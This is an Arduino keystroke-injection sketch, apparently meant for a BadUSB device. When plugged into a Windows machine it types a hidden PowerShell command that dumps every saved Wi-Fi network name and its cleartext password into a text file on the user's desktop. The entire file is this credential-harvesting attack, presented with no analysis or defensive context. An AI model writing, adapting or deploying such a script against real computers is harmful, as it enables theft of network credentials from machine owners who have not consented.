#include <Keyboard.h>

void setup() {
  delay(2000);
  Keyboard.begin();
  delay(500);

  Keyboard.println("powershell -WindowStyle Hidden");
  delay(1000);
  Keyboard.println("netsh wlan show profiles | ForEach { $_ -match ': (.+)$' | Out-Null; $name = $Matches[1]; $pass = (netsh wlan show profile name=\"$name\" key=clear | Select-String 'Key Content').ToString().Split(':')[1].Trim(); \"$name : $pass\" } > $env:USERPROFILE\Desktop\wifi-passwords.txt");
  Keyboard.end();
}

void loop() {
  // Do nothing
}
